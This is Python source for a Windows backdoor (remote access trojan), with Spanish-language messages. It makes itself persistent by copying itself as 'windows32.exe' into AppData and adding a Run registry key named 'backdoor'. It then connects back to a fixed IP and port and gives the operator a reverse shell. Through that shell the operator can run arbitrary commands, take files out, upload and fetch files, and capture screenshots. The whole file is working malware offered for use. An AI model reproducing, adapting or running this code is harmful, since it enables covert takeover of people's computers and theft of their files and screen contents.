#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
import mss
 
def enviar_datos(data):
    datasend = json.dumps(data)
    sock.send(datasend)
 
def screenshot():
    screen = mss.mss()
    screen.shot()
    
def admin_check():
    global admin
    try:
        check = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
    except:
        admin = "ERROR, privilegios insuficientes"
    else:
        admin = "Privilegios de administrador"
 
    
def recibir_datos():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue
 
def create_persistence():
    location = os.environ['appdata'] + "\\windows32.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)
        
def connection():
    while True:
        time.sleep(2)
        try:
            sock.connect(('192.168.253.15',7777))
            shell()
        except:
            connection()
 
def download(url):
    file_download = requests.get(url)
    name_file = url.split("/")[-1]
    with open(name_file,'wb') as file_out:
        file_out.write(file_download.content)
 
def shell():
    while True:
        s = sock.recv(2048)
        if s == "q":
            break
        elif s[:2] == "cd" and len(s) > 1:
            try:
                os.chdir(s[3:])
                sock.send(str(os.getcwd()))
            except:
                continue
        elif s[:8] == "download":
            with open(s[9:],'rb') as file_download:
                sock.send(base64.b64encode(file_download.read()))
        elif s[:6] == "upload":
            with open(s[7:],'wb') as file_upload:
                datos = sock.recv(20480)
                file_upload.write(base64.b64decode(datos))
        elif s[:3] == "get":
            try:
                download(s[4:])
                sock.send("Archivo descargado!")
            except:
                sock.send("Error al descargar el archivo")
        elif s[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png",'rb') as sc:
                    sock.send(base64.b64encode(sc.read()))
                os.remove('monitor-1.png')
            except:
                sock.send(base64.b64encode("fail"))
        elif s[:5] == "check":
            try:
                admin_check()
                sock.send(admin)
            except:
                sock.send("No pude realizar la tarea")
        elif s[:5] == 'start':
            try:
                subprocess.Popen(s[6:],shell=True)
                sock.send("Programa iniciado!")
            except:
                sock.send("Error al iniciar el programa")
        else:
            result = subprocess.Popen(s, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            proc = result.stdout.read() + result.stderr.read()
            if len(proc) == 0:
                sock.send("1")
            else:
                sock.send(proc)
                
create_persistence()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
shell()
sock.close()